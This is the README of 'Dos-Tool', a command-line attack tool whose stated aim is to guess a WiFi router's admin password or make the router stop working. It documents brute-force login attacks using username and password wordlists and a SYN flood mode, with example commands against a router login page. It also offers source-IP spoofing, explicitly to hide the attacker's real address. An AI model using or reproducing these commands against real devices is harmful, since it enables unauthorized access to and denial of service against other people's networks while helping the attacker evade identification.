# Dos-Tool

Guess the WiFi manage password or make it can not work

## Usage

```bash
Usage: dostool [option]
Example:
./dostool -a 0 -u "admin" -i "http:\\192.168.1.1:80/login.asp
./dostool -a 0 -U "/path/username.txt" -P "/path/password.txt"
./dostool -a 0 -u "admin" -P "/path/password.txt"
./dostool -a 0 -P "/path/password.txt"
./dostool -a 1 -i "192.168.1.1:80" -i "http:\\192.168.1.1:80/login.asp"

-a    Indicate attack mode
      0    Guess the web password
      1    Syn flood attack

-u    Indicate user-provided username (default 'admin', must use with -a 0)
-U    Indicate user-provided username file (must use with -a 0 and -P)
-P    Indicate user-provided password file (must use with -a 0)
-r    Indicate random password generate length (default 8)
-d    Indicate debug level (default 0)
      0    turn off the debug show
      1    show less debug message
      2    show verbose debug message
      3    show all debug message
-p    Set the process number (default 4)
-t    Set the thread number (default 2)
-i    Indicate intent URL address (user shoud indicate the port in thr URL)
-m    Type of router
      feixun_fwr_604h .etc
-h    Show this message
--get-response-length    Get the response length for test
--set-watch-length       Indicate a length, if response's length not equal this, return
-R    Use the random source IP address in dos attack (can not use in the guess password attack)
      0    turn off the random source ip address which can protect you true IP in the local net
      1    enable random source ip address (default)
--ip-repeat-time         if you use the -R, indicate the each random ip repeat send times(default 1024)
```